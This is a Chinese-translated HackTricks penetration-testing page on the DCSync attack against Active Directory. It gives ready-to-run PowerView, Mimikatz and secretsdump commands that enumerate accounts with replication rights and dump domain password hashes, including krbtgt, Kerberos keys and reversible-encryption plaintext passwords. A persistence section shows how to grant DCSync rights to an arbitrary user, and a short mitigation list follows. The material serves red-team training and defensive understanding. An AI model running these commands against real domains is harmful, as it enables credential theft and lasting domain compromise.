# DCSync

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

## DCSync

**DCSync**权限意味着对域本身具有以下权限：**DS-Replication-Get-Changes**、**Replicating Directory Changes All**和**Replicating Directory Changes In Filtered Set**。

**关于DCSync的重要说明：**

* **DCSync攻击模拟域控制器的行为，并要求其他域控制器使用目录复制服务远程协议（MS-DRSR）复制信息**。由于MS-DRSR是Active Directory的有效和必要功能，因此无法关闭或禁用它。
* 默认情况下，只有**域管理员、企业管理员、管理员和域控制器**组具有所需的特权。
* 如果任何帐户密码使用可逆加密存储，Mimikatz中有一个选项可以返回明文密码

### 枚举

使用`powerview`检查具有这些权限的用户：
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### 本地利用

Exploit Locally（本地利用）是一种攻击方法，利用该方法可以在目标系统上执行特权操作。在Active Directory环境中，本地利用通常用于获取域控制器的敏感信息。

#### DCSync

DCSync是一种利用本地攻击方法，用于从域控制器中提取域账户的敏感信息。通过DCSync，攻击者可以模拟域控制器并请求目标域控制器复制指定账户的敏感信息，如NTLM哈希。

要使用DCSync，攻击者需要具有域内的管理员权限。攻击者可以使用Mimikatz等工具来执行DCSync攻击。以下是执行DCSync攻击的步骤：

1. 获取域内管理员权限。
2. 执行Mimikatz等工具，并加载相应的模块。
3. 使用`lsadump::dcsync /user:<username>`命令，其中`<username>`是要提取敏感信息的目标账户。
4. 提取的敏感信息将显示在输出中，包括NTLM哈希。

DCSync攻击可以帮助攻击者获取域账户的敏感信息，如密码哈希，从而进一步扩大攻击面。因此，保护域控制器免受DCSync攻击至关重要。
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### 远程利用

DCSync can be exploited remotely if the attacker has administrative privileges on a domain-joined machine or has compromised a domain user account with the necessary permissions.

DCSync可以在远程利用，如果攻击者在加入域的计算机上拥有管理员权限，或者已经入侵了具备必要权限的域用户账户。

To exploit DCSync remotely, the attacker can use tools like Mimikatz or Impacket to interact with the domain controller and request the replication of a specific user's credentials.

要远程利用DCSync，攻击者可以使用Mimikatz或Impacket等工具与域控制器进行交互，并请求复制特定用户的凭据。

The attacker needs to have network connectivity to the domain controller and the necessary credentials to authenticate to the domain.

攻击者需要与域控制器建立网络连接，并具备必要的凭据以进行域身份验证。

Once the attacker successfully replicates the user's credentials, they can use them to impersonate the user and gain unauthorized access to sensitive information or perform malicious actions within the domain.

一旦攻击者成功复制了用户的凭据，他们可以使用这些凭据冒充用户，并未授权地访问敏感信息或在域内执行恶意操作。
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` 生成3个文件：

* 一个包含**NTLM哈希值**的文件
* 一个包含**Kerberos密钥**的文件
* 一个包含启用了[**可逆加密**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption)的NTDS中明文密码的文件。你可以使用以下命令获取启用了可逆加密的用户：

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### 持久化

如果你是域管理员，你可以使用`powerview`将这些权限授予任何用户：
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
然后，您可以通过查看以下输出来**检查用户是否正确分配了3个权限**（您应该能够在"ObjectType"字段中看到权限的名称）：
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### 缓解措施

* 安全事件ID 4662（必须启用对象的审核策略）- 对象上执行了一个操作
* 安全事件ID 5136（必须启用对象的审核策略）- 修改了目录服务对象
* 安全事件ID 4670（必须启用对象的审核策略）- 更改了对象的权限
* AD ACL Scanner - 创建和比较ACL的创建报告。[https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## 参考资料

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用全球**最先进**的社区工具驱动。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
